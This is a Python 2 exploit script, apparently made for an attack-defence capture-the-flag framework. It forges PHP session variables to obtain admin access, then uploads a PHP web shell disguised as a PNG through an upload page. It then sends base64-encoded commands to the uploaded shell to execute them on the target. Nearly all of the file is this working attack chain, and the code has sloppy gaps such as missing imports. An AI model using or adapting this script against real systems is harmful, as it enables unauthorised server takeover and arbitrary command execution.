#!/usr/bin/env python

import requests,re
from framework.http import http
from framework.config import *
from framework.function import *
from urllib import quote
import traceback
from random import randint

def vulnerable_attack(target,target_port,cmd):
        
    '''
    this is the payload script for vuln:

    echo file_get_contents($_POST[444]);

    '''

    try:
        data = cmd 
        #res = http("get",target,target_port,"/bigbrother?filename="+data,'',headers)
	res = shit(target,target_port,data)
        # Even though we can not execute the cmd with the vuln, but we can read flag
        # and we want to use our framework to carry out this attack
        # not do the replicate tasks to code a new script
    except Exception,e:
        debug_print(traceback.format_exc())     
        dump_error("attack failed",target,"vulnerable attack")
        res = "error"

    return res

def shit(target,target_port,cmd):
    s = requests.Session()
    ip = target

    url_1 = 'http://%s:%s/index.php' % (ip,str(target_port))

    headers = {"Cookie": "PHPSESSID=vd8cmsjv9la0ektlnvtr20rru6"}
    s.post(url_1,data="_SESSION[login_in]=1&_SESSION[admin]=1&_SESSION[login_time]=999999999999",headers=headers)

    url_2 = 'http://%s:%s/admin/upload.php' % (ip,str(target_port))
    
    my_hash = hashlib.md5(str(randint(1,10000000))).hexdigest()[:8]
    shell = "<?php system(base64_decode($_POST['%s']));?>" % my_hash
    open('/tmp/a.php','w').write(shell)

    files = {'up':('a.php',open('/tmp/a.php','r'),'image/png')}
    headers = {"X-Requested-With": "XMLHttpRequest"}
    print url_1
    headers = {"Cookie": "PHPSESSID=vd8cmsjv9la0ektlnvtr20rru6"}
    content = s.post(url_2,files=files,headers=headers).content
    import json
    

    index_1 = content.find(").val('") + len(").val('")
    index_2 = content.find("');self.parent")

    path = content[index_1:index_2]

    url_2 = 'http://%s:%s/upload/' % (ip,str(target_port))
    url_2 += path

    print url_2

    final_url = url_2
    print final_url
    res = s.post(final_url,data={my_hash:quote(base64.b64encode(cmd))}).content

    print res


    return res
